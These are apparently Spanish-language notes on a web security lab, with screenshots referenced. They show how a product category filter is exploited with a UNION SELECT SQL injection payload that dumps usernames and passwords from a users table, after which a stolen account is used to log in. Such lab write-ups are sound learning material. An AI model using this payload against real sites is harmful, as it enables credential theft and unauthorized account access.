Tenemos el siguiente laboratorio:
![[Pasted image 20240507183336.png]]
Haciendo clic en alguna de las categorías, vemos que se hace la query en cada una de ellas:
![[Pasted image 20240507183500.png]]
Por lo que podemos usar el siguiente payload:
```bash
/filter?category=Corporate+gifts'+UNION+SELECT+username,+password+FROM+users--
```
Y vemos cómo obtenemos los usuarios:
![[Pasted image 20240507183604.png]]
Si probamos en acceder con alguna de las cuentas, funciona:
![[Pasted image 20240507183659.png]]
